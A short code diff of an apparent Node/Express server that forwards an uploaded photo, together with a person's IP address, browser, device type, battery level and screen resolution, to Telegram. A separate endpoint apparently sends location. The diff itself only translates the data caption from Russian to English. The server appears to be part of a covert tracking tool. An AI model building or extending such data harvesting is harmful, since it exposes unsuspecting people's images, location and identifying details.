@@ -40,13 +40,13 @@ app.post('/sendPhotoToTelegram', upload.single('photo'), async (req, res) => {
       knownLength: photo.size,
     });
 
-    const caption = `Данные о пользователе:\n\n` +
-                    `🔋 Уровень батареи: ${batteryLevel}\n\n` +
+    const caption = `User Data:\n\n` +
+                    `🔋 battery Level : ${batteryLevel}\n\n` +
                     `📍 IP Address: ${userIP}\n\n` +
                     `🌐 Browser: ${req.headers['user-agent']}\n\n` +
-                    `📱 Тип устройства: ${req.headers['user-agent'].includes('Mobile') ? 'Mobile Device' : 'Desktop Device'}\n\n` +
-                    `🖥 Платформа: ${req.headers['user-agent'].includes('Windows') ? 'Windows' : 'Other'}\n\n` +
-                    `📏 Разрешение экрана: ${screenWidth}x${screenHeight}`;
+                    `📱 Device: ${req.headers['user-agent'].includes('Mobile') ? 'Mobile Device' : 'Desktop Device'}\n\n` +
+                    `🖥 Platform: ${req.headers['user-agent'].includes('Windows') ? 'Windows' : 'Other'}\n\n` +
+                    `📏 Resolution: ${screenWidth}x${screenHeight}`;
 
     formData.append('caption', caption);
 
@@ -94,3 +94,4 @@ app.post('/sendLocationToTelegram', async (req, res) => {
 app.listen(PORT, () => {
   console.log(`Server is running on port ${PORT}`);
 });
+
